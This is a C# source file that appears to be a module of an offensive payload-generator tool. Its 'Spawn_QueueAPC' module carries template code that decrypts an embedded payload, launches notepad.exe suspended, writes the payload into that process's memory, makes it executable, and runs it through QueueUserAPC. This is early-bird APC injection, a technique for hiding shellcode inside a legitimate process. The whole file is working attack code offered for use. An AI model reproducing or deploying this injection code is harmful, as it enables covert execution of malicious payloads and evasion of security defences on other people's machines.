using Models;

namespace Modules
{
    public class Spawn_QueueAPC : Models.Module
    {
        public override string Name => "Spawn_QueueAPC";

        public override string Description => "Execute in Spawned process via QueueAPC";

        public override Types Type => Types.Spawn;

        public override string Header => Models.Defaults.Header;

        public override string Footer => Models.Defaults.Footer;

        public override string Core => @"
         byte[] payload = Decrypt(b64, key, iv);

         var pa = new Utils.Kernel32.SECURITY_ATTRIBUTES();
         pa.nLength = Marshal.SizeOf(pa);

         var ta = new Utils.Kernel32.SECURITY_ATTRIBUTES();
         ta.nLength = Marshal.SizeOf(ta);

         var si = new Utils.Kernel32.STARTUPINFO();

         if (!Utils.Kernel32.CreateProcess(@""C:\Windows\System32\notepad.exe"", null,
             ref pa, ref ta,
             false,
             Utils.Kernel32.CreationFlags.CreateSuspended,
             IntPtr.Zero, @""C:\Windows\System32"", ref si, out var pi))
         {
            return;
         }

         var baseAddress = Utils.Kernel32.VirtualAllocEx(
             pi.hProcess,
             IntPtr.Zero,
             payload.Length,
             Utils.Kernel32.AllocationType.Commit | Utils.Kernel32.AllocationType.Reserve,
             Utils.Kernel32.MemoryProtection.ReadWrite);

         Utils.Kernel32.WriteProcessMemory(
             pi.hProcess,
             baseAddress,
             payload,
             payload.Length,
             out _);

         Utils.Kernel32.VirtualProtectEx(
             pi.hProcess,
             baseAddress,
             payload.Length,
             Utils.Kernel32.MemoryProtection.ExecuteRead,
             out _);

         Utils.Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);

         _ = Utils.Kernel32.ResumeThread(pi.hThread);
      }";
    }
}
